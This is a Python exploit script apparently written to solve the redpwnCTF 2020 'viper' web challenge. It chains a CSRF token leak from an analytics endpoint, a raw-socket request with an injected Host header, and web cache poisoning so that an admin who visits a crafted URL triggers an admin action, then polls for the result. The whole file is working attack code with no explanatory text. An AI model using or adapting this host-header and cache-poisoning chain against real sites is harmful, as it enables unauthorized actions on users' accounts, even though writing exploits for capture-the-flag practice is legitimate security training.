#!/usr/bin/env python3
import requests, socket, re
from urllib.parse import quote
from base64 import b64encode

HOST, PORT = "2020.redpwnc.tf", 31291
#HOST, PORT = "localhost", 31337

proxy = {
    "http": "http://127.0.0.1:8080/"
}

ADMIN_VIPER = "AAAAAAAA-AAAA-4AAA-8AAA-AAAAAAAAAAAA"

# Create new viper and fetch cookie and Viper ID
r = requests.get("http://{}:{}/create".format(HOST,PORT), allow_redirects=False, proxies=proxy)
viper_id = re.findall("([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})", r.text)[0]
sessid = r.cookies["connect.sid"]
cookies = {"connect.sid" : sessid}

# Get the csrf token
r = requests.get("http://{}:{}/analytics?ip_address=__csrftoken__admin_account".format(HOST, PORT), proxies=proxy)
csrftoken = quote(b64encode(r.text.split()[-2].encode()))

# Inject host header
payload = ""
payload += "GET /viper/{} HTTP/1.1\r\n".format(viper_id)
payload += "Host: {}:{}\\admin\\create?x=<!--&viperId={}&csrfToken={}#-->\r\n".format(HOST, PORT, ADMIN_VIPER, csrftoken)
payload += "Accept: */*\r\n"
payload += "Cookie: connect.sid={}\r\n".format(sessid)
payload += "\r\n"

s = socket.socket()
s.connect((HOST, PORT))
s.sendall(payload.encode())
print(s.recv(32768))
s.close()

# Cache request
r = requests.get("http://{}:{}/viper/{}".format(HOST, PORT, viper_id), cookies=cookies, proxies=proxy)
print(r.text)

print("Send this URL to the admin")
print("http://{}:{}/viper/{}".format(HOST, PORT, viper_id))

while True:
    input("\nClick to continue fetching http://{}:{}/viper{} ... ".format(HOST, PORT, ADMIN_VIPER))
    r = requests.get("http://{}:{}/viper/{}".format(HOST, PORT, ADMIN_VIPER), cookies=cookies, proxies=proxy)
    print(r.text)